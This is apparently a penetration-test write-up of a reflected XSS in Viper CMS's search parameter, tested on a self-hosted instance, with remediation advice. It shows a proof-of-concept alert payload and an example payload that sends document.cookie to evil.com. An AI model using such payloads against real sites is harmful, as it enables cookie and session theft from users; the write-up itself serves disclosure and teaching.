# 🐾 Reflected XSS in Viper CMS

During a routine penetration test on **Viper CMS**, I discovered a **reflected cross-site scripting (XSS)** vulnerability in the `search` query parameter.

<Note>
  This test was performed on a self-hosted environment. Always obtain proper authorization before testing systems that you do not own.
</Note>

---

## 🔍 Discovery

While testing input fields across the application, I noticed the `search` endpoint echoed back unsanitized user input directly into the HTML.

## 🧪 Vulnerable Parameter

`http://localhost/search?q=<script>alert('xss')</script>`

When this payload was injected, the script was executed in the browser, confirming a reflected XSS.

The key issue was the absence of HTML escaping on the q parameter in the rendered output.

## 💥 Exploitation

This type of vulnerability allows attackers to:

- Execute JavaScript in a victim’s browser
- Steal cookies, session tokens, or other sensitive information
- Perform actions on behalf of the user (CSRF-like effects)
- Bypass some client-side validations

Example payload:

`<script>fetch('https://evil.com/log?c=' + document.cookie)</script>`

This would exfiltrate a user's cookies to an external server controlled by the attacker.

## 🔐 Remediation

The application should escape user input before rendering it back to the browser. Proper remediation steps include:

- HTML encode (&lt;, &gt;, &quot;, etc.)
- Use templating engines that auto-escape
- Employ CSP (Content Security Policy) headers
- Sanitize input using libraries like DOMPurify
